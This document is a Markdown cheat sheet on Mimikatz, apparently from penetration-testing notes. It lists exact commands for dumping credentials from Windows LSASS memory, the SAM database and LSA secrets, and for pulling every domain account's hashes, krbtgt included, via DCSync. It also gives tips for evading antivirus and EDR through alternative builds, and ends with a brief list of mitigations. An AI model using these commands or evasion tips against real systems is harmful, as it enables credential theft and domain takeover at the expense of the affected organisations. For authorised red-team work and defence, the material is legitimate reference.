# Mimikatz

Post-exploitation tool for extracting credentials from Windows memory. Requires local admin / SYSTEM privileges.

## Running Mimikatz

```powershell
# Run as admin
.\mimikatz.exe

# Enable debug privilege (required for most commands)
privilege::debug

# Should return "Privilege '20' OK"
```

## Dumping Credentials

### logonpasswords

Dumps credentials from LSASS memory:

```
sekurlsa::logonpasswords
```

Returns:
- Usernames
- NTLM hashes
- Cleartext passwords (if WDigest is enabled)
- Kerberos tickets

### SAM Database

```
# Dump local SAM hashes
lsadump::sam

# From a SAM backup
lsadump::sam /system:SYSTEM /sam:SAM
```

### LSA Secrets

```
lsadump::lsa /patch
```

Dumps service account credentials and cached domain credentials.

### DCSync

Extract credentials directly from the Domain Controller (requires DA or replication rights):

```
# Single user
lsadump::dcsync /user:krbtgt

# All users
lsadump::dcsync /domain:DOMAIN.local /all /csv
```

**Note:** DCSync doesn't require running Mimikatz on the DC itself.

## Golden Ticket Attack

See [Golden Ticket](golden-ticket.md) for the full attack chain using the krbtgt hash from DCSync.

## Common Issues

- **AV/EDR detection** -- Mimikatz is heavily signatured. Use Invoke-Mimikatz (PowerShell), pypykatz (Python), or custom builds
- **Credential Guard** -- Blocks LSASS credential dumping on newer Windows
- **WDigest disabled** -- No cleartext passwords (default since Windows 8.1/2012 R2)

## Mitigations

- Enable Credential Guard
- Disable WDigest authentication
- Use Protected Users security group
- Monitor for LSASS access (Sysmon Event ID 10)
- Limit local admin privileges
